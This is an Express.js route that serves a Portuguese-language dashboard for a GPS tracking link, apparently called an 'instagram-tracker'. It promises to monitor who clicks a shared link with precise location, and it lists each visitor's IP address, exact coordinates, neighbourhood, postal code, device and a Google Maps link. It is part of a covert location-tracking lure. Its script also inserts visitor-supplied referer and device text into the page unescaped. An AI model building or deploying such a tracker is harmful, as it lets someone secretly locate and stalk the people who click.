app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>📊 Dashboard de Rastreamento GPS</title>
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 2rem;
        }
        .container {
          max-width: 1200px;
          margin: 0 auto;
        }
        .header {
          background: white;
          padding: 2rem;
          border-radius: 15px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
          margin-bottom: 2rem;
          text-align: center;
        }
        .header h1 {
          color: #333;
          margin-bottom: 1rem;
          font-size: 2rem;
        }
        .tracking-link {
          background: #667eea;
          color: white;
          padding: 1rem 2rem;
          border-radius: 10px;
          display: inline-block;
          margin-top: 1rem;
          text-decoration: none;
          font-weight: 600;
          transition: transform 0.3s;
        }
        .tracking-link:hover {
          transform: translateY(-2px);
        }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
          gap: 1rem;
          margin-bottom: 2rem;
        }
        .stat-card {
          background: white;
          padding: 1.5rem;
          border-radius: 15px;
          box-shadow: 0 5px 15px rgba(0,0,0,0.1);
          text-align: center;
        }
        .stat-card h3 {
          color: #667eea;
          font-size: 2rem;
          margin-bottom: 0.5rem;
        }
        .stat-card p {
          color: #666;
          font-size: 0.9rem;
        }
        .clicks-container {
          display: grid;
          gap: 1.5rem;
        }
        .click-card {
          background: white;
          padding: 2rem;
          border-radius: 15px;
          box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .click-card.with-gps {
          border-left: 5px solid #10b981;
        }
        .click-card.no-gps {
          border-left: 5px solid #ef4444;
        }
        .click-info {
          display: grid;
          gap: 0.8rem;
        }
        .click-info-row {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          font-size: 0.95rem;
        }
        .click-info-row strong {
          min-width: 150px;
          color: #333;
        }
        .click-info-row span {
          color: #666;
        }
        .maps-link {
          display: inline-block;
          background: #10b981;
          color: white;
          padding: 0.8rem 1.5rem;
          border-radius: 8px;
          text-decoration: none;
          margin-top: 1rem;
          font-weight: 600;
          transition: transform 0.3s;
        }
        .maps-link:hover {
          transform: translateY(-2px);
        }
        .reload-btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 1rem 2rem;
          border-radius: 10px;
          cursor: pointer;
          font-size: 1rem;
          font-weight: 600;
          margin-bottom: 2rem;
          transition: transform 0.3s;
        }
        .reload-btn:hover {
          transform: translateY(-2px);
        }
        .empty-state {
          background: white;
          padding: 3rem;
          border-radius: 15px;
          text-align: center;
          color: #666;
        }
        .loading {
          text-align: center;
          color: white;
          font-size: 1.2rem;
          padding: 2rem;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>📊 Dashboard de Rastreamento GPS</h1>
          <p>Monitore quem clica no seu link com localização precisa</p>
          <a href="/track" class="tracking-link" target="_blank">
            🔗 Seu link de rastreamento: https://instagram-tracker-x6vp.onrender.com/track
          </a>
        </div>

        <button class="reload-btn" onclick="loadData()">🔄 Atualizar</button>

        <div id="stats" class="stats"></div>
        <div id="clicks" class="clicks-container"></div>
        <div id="loading" class="loading">Carregando dados...</div>
      </div>

      <script>
        async function loadData() {
          try {
            const response = await fetch('/api/stats');
            const data = await response.json();
            
            // Atualiza estatísticas
            document.getElementById('stats').innerHTML = \`
              <div class="stat-card">
                <h3>\${data.totalClicks}</h3>
                <p>Total de Cliques</p>
              </div>
              <div class="stat-card">
                <h3>\${data.clicksComGPS || 0}</h3>
                <p>Com GPS</p>
              </div>
              <div class="stat-card">
                <h3>\${data.totalClicks - (data.clicksComGPS || 0)}</h3>
                <p>Sem GPS</p>
              </div>
            \`;

            // Atualiza lista de cliques
            const clicksHtml = data.clicks.map(click => {
              const hasGPS = click.gps && click.gps.lat;
              const location = click.localizacao;
              
              return \`
                <div class="click-card \${hasGPS ? 'with-gps' : 'no-gps'}">
                  <div class="click-info">
                    <div class="click-info-row">
                      <strong>⏰ Data/Hora:</strong>
                      <span>\${new Date(click.timestamp).toLocaleString('pt-BR')}</span>
                    </div>
                    <div class="click-info-row">
                      <strong>🌐 IP:</strong>
                      <span>\${click.ip}</span>
                    </div>
                    
                    \${hasGPS ? \`
                      <div class="click-info-row">
                        <strong>📍 Status:</strong>
                        <span style="color: #10b981; font-weight: 600;">LOCALIZAÇÃO GPS EXATA</span>
                      </div>
                      \${location ? \`
                        <div class="click-info-row">
                          <strong>🏙️ Cidade:</strong>
                          <span>\${location.cidade}, \${location.estado}, \${location.pais}</span>
                        </div>
                        <div class="click-info-row">
                          <strong>🏘️ Bairro:</strong>
                          <span>\${location.bairro}</span>
                        </div>
                        <div class="click-info-row">
                          <strong>📮 CEP:</strong>
                          <span>\${location.cep}</span>
                        </div>
                      \` : ''}
                      <div class="click-info-row">
                        <strong>🗺️ Coordenadas:</strong>
                        <span>\${click.gps.lat}, \${click.gps.lng}</span>
                      </div>
                      <a href="https://www.google.com/maps?q=\${click.gps.lat},\${click.gps.lng}" 
                         target="_blank" class="maps-link">
                        📍 Ver no Google Maps
                      </a>
                    \` : \`
                      <div class="click-info-row">
                        <strong>⚠️ Status:</strong>
                        <span style="color: #ef4444;">GPS não autorizado (localização por IP imprecisa)</span>
                      </div>
                    \`}
                    
                    <div class="click-info-row">
                      <strong>🔗 Origem:</strong>
                      <span style="font-size: 0.85rem; word-break: break-all;">\${click.referer}</span>
                    </div>
                    <div class="click-info-row">
                      <strong>📱 Dispositivo:</strong>
                      <span>\${click.device}</span>
                    </div>
                  </div>
                </div>
              \`;
            }).join('');

            document.getElementById('clicks').innerHTML = clicksHtml || 
              '<div class="empty-state">Nenhum clique rastreado ainda. Compartilhe seu link!</div>';
            
            document.getElementById('loading').style.display = 'none';
          } catch (error) {
            console.error('Erro ao carregar dados:', error);
            document.getElementById('loading').innerHTML = 'Erro ao carregar dados. Tente novamente.';
          }
        }

        // Carrega os dados ao abrir a página
        loadData();

        // Auto-atualiza a cada 10 segundos
        setInterval(loadData, 10000);
      </script>
    </body>
    </html>
  `);
});
